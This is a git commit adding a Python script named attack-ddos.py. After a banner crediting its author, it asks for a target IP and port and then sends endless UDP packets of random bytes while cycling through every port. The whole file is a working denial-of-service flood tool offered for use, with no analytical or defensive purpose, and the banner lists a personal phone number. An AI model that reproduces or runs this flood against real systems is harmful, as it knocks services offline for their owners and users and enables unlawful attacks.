1b204bb7d77e53b44c989470a371664f9c35adb1
MrVirusSpm-07 <81134812+MrVirusSpm-07@users.noreply.github.com>
2021-03-26 16:59:31 +0700

    Add files via upload

---
+++ attack-ddos.py
@@ -0,0 +1,58 @@
+coding: utf-8
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+time.sleep(1)
+os.system("figlet DDos Attack")
+print ("\033[1;36m=======================================")
+print
+time.sleep(1)
+print ("\033[1;36mAuthor \033[1;32m: \033[1;35mDicky Andre")
+print ("\033[1;36mYutube \033[1;32m: \033[1;35mMR VIRUS SPM")
+print ("\033[1;36mGithub \033[1;32m: \033[1;35mhttps://github.com/MrVirusSpm-07")
+print ("\033[1;36mWhasap \033[1;32m: \033[1;35m+6281574614665")
+print
+time.sleep(1)
+ip = raw_input("1P Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+time.sleep(1)
+print
+os.system("figlet Attack ")
+time.sleep(1)
+print ("[menyerang......] 2%   ")
+time.sleep(1)
+print ("[menyerang......] 4℅  ")
+time.sleep(1)
+print ("[menyerang......] 6℅  ")
+time.sleep(1)
+print ("[menyerang......] 8℅  ")
+time.sleep(1)
+print ("[menyerang......] 10℅ ")
+time.sleep(1)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
+     if port == 65534:
+       port = 1
